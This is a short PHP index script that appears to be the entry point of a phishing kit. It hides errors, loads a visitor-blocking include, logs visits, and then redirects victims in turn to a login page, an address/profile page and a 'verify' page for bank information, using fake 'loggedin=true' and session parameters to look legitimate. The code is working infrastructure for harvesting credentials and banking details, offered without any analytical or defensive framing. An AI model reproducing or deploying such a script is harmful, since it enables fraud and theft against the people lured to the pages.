<?php
error_reporting(0);
@ob_start();
ini_set("output_buffering",4096);
session_start();

require_once 'inc/check_blocked.php'; 
require_once 'inc/config.php';
require_once 'inc/functions.php';

if($log_visits) {
	include_once 'inc/log.php';
}


if(!isset($_SESSION['SESSION_ID']))
{
	$_SESSION['SESSION_ID'] = uniqid(rand(10, 20), true);
}

$host = bin2hex($_SERVER['HTTP_HOST']);


if(!$disable_login_page) {
	header("Location: login.php?p=0&sessionid=".$host);
} else if(!$disable_address_page) {
	header("Location: profile.php?loggedin=true&result=0&sessionid=".$host);
} else if(!$disable_bank_info_page) {
	header("Location: verify.php?loggedin=true&client=".uniqid($_SESSION['SESSION_ID'], false)."&sessionid=".$host);
} else {
	die();
}
ob_end_flush();


?>